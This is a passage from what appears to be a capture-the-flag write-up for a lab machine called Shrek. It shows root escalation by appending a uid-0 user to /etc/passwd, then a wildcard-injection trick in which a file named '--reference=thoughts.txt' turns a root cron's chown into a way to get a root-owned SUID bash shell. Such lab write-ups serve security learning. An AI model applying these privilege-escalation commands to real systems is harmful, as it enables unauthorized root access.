[sec@shrek src]$ ln -s /etc/passwd

```

### passwd

Now I just need to add a root user to `/etc/passwd`. I’ll create a hash:

```

[sec@shrek src]$ openssl passwd -1 0xdf
$1$LDbqXSxU$TnJPI4lNp/q00QKZYZw0G.

```

Now I’ll add the string to `passwd`, with uid and gui both 0 for root:

```

[sec@shrek src]$ echo 'oxdf:$1$LDbqXSxU$TnJPI4lNp/q00QKZYZw0G.:0:0:pwned:/root:/bin/bash' >> /etc/passwd

```

Now use `su` to become root:

```

[sec@shrek src]$ su oxdf                                                                 
Password:                                                                                
[root@shrek src]#

```

And grab `root.txt`:

```

[root@shrek ~]# cat root.txt
54d3c885************************

```

## Beyond Root

### thoughts.txt

`thoughts.txt` is a file that sits in `/usr/src` and is owned by root:

```

[sec@shrek src]$ ls -l
total 4
-rw-r--r-- 1 root root 91 Aug 22  2017 thoughts.txt

```

Why isn’t the owner changed to nobody when the cron runs? I used my root shell to try to run the same command, and it raises an error:

```

[root@shrek src]# chown nobody:nobody *
chown: changing ownership of 'thoughts.txt': Operation not permitted

```

Googling for that error message leads to [this post on askubuntu](https://askubuntu.com/questions/675296/changing-ownership-operation-not-permitted-even-as-root), which suggests the file could be immutable. In fact, it does have that flag set in the extended attributes:

```

[root@shrek src]# lsattr thoughts.txt 
----i---------e---- thoughts.txt

```

I have run into this before in the 2019 SANS Holiday Hack Challenge [Nyanshell terminal](/holidayhack2019/8#terminal---nyanshell). `lsattr` is the command to read extended attributes, but the [man page](https://linux.die.net/man/1/lsattr) directs over to the `chattr` [man page](https://linux.die.net/man/1/chattr) (the command to change extended attributes) for the list of attributes and what they are.

In this case, there are two flags set, `i` for immutable and `e` for extend format, which means “the file is using extents for mapping the blocks on disk”.

The purpose of this file still wasn’t totally clear to me, but I think I figured it out after the next section.

### Automation

In addition to `root.txt`, there’s another executable file, `chown` in `/root`:

```

[root@shrek ~]# ls -l
total 8
-rwx------ 1 root root 362 Aug 22  2017 chown
-r-------- 1 root root  33 Aug 22  2017 root.txt

```

It is actually a Python script:

```

[root@shrek ~]# file chown 
chown: Python script, ASCII text executable

```

The script is quite simple:

```

#!/usr/bin/python

from subprocess import run, PIPE, DEVNULL

find = run(["/usr/bin/find", "/usr/src", "-perm", "-4000"], stdout=PIPE, stderr=DEVNULL, encoding="utf-8").stdout.split('\n')[:-1]

chown = run(["cd /usr/src; /usr/bin/chown nobody:nobody *"], stderr=DEVNULL, shell=True)

for suid in find:
        chmod = run(["/usr/bin/chmod", "+s", suid],stderr=DEVNULL)

```

It uses `subprocess.run` to do three things:
- Run the `find` command to get a list of any SUID files in the `/usr/src` directory.
- Change into the `/usr/src` directory and run `/usr/bin/chown nobody:nobody *`.
- Loop over the SUID file names from the first command, and for each, run `chmod +s [file]`.

I understood the second was what allowed the exploit to root, but it took me a minute to see what the first and third actions were for.

### Slightly Alternative Root

The immutable `thoughts.txt` file and the strange resetting of SUID in the automation Python together provide an alternative way to exploit the wildcard vulnerability.

Instead of getting an important file that should be owned by root to be owned by sec, I’ll create a SUID binary and get the cron to have it owned by root. I’ll drop a copy of `bash` into `/usr/src`, set it to SUID, and create a file so that `chown` will reference `thought.txt`:

```

[sec@shrek src]$ touch -- --reference=thoughts.txt
[sec@shrek src]$ cp /bin/bash 0xdf
[sec@shrek src]$ chmod +s 0xdf 
[sec@shrek src]$ ls -l
total 816
-rwsr-sr-x 1 sec  users 828320 Jul 17 11:55  0xdf
-rw-r--r-- 1 sec  users      0 Jul 17 11:55 '--reference=thoughts.txt'
-rw-r--r-- 1 root root      91 Aug 22  2017  thoughts.txt

```

When the cron runs, `0xdf` is now owned by root, and still SUID:

```

[sec@shrek src]$ ls -l
total 816
-rwsr-sr-x 1 root root  828320 Jul 17 11:55  0xdf
-rw-r--r-- 1 sec  users      0 Jul 17 11:55 '--reference=thoughts.txt'
-rw-r--r-- 1 root root      91 Aug 22  2017  thoughts.txt

```

And it will give me a root shell:

```

[sec@shrek src]$ ./0xdf -p
0xdf-4.4# 

```

I don’t like this path because it is not realistic. It makes sense that there are places in the real world running `chown nobody:nobdy *` on directories, and that enables this wildcard attack. But it’s incredibly unlikely that any cron would then go back and re-add the SUID bit on files that had it. That is kind of the opposite of why you would be changing the owner. And this attack doesn’t work without that bit in the script. To demonstrate, I’ll clear it out and set it up again:

```

[sec@shrek src]$ cp /bin/bash 0xdf
[sec@shrek src]$ chmod +s 0xdf 
[sec@shrek src]$ touch -- --reference=thoughts.txt
[sec@shrek src]$ ls -l
total 816
-rwsr-sr-x 1 sec  users 828320 Jul 17 12:12  0xdf
-rw-r--r-- 1 sec  users      0 Jul 17 12:12 '--reference=thoughts.txt'
-rw-r--r-- 1 root root      91 Aug 22  2017  thoughts.txt

```

Now as root, I’ll run `chown nobody:nobody *`:

```

0xdf-4.4# /usr/bin/chown nobody:nobody *
/usr/bin/chown: cannot access 'nobody:nobody': No such file or directory
/usr/bin/chown: changing ownership of 'thoughts.txt': Operation not permitted

```

That changes the ownership of `0xdf`, but it’s no longer SUID, and thus, of no use to me:

```

[sec@shrek src]$ ls -l
total 816
-rwxr-xr-x 1 root root  828320 Jul 17 12:12  0xdf
-rw-r--r-- 1 sec  users      0 Jul 17 12:13 '--reference=thoughts.txt'
-rw-r--r-- 1 root root      91 Aug 22  2017  thoughts.txt

```

The [man page](https://linux.die.net/man/3/chown) makes it not at all clear:

> If the specified file is a regular file, one or more of the S\_IXUSR, S\_IXGRP, or S\_IXOTH bits of the file mode are set, and the process does not have appropriate privileges, the set-user-ID (S\_ISUID) and set-group-ID (S\_ISGID) bits of the file mode shall be cleared upon successful return from *chown*(). If the specified file is a regular file, one or more of the S\_IXUSR, S\_IXGRP, or S\_IXOTH bits of the file mode are set, and the process has appropriate privileges, it is implementation-defined whether the set-user-ID and set-group-ID bits are altered.

The `S_IXUSR`, `S_IXGRP`, and `S_IXOTH` bits are just the user, group, and other users execute bits (displayed as `x` in `ls -l`). Given that the cron is running as root, it should have the appropriate privileges, so the second sentence should apply, which means it’s implementation-defined as to if the SUID/SGID bits are altered.

I did also notice the error message when I ran `chown nobody:nobody *` as root:

```

/usr/bin/chown: cannot access 'nobody:nobody': No such file or directory

```

That might not make immediate sense, but think again about the wildcard expansion and what’s happening. When it runs, the command becomes:

```

chown nobody:nobody 0xdf --reference=thoughts.txt thoughts.txt

```

That is more readable (and the same command) reordered as:

```

chown --reference=thoughts.txt nobody:nobody 0xdf thoughts.txt

```

Once `chown` is passed `--reference`, it doesn’t look for a user/group setting, so it treats the rest of the arguments as files, and there is no file named `nobody:nobody`.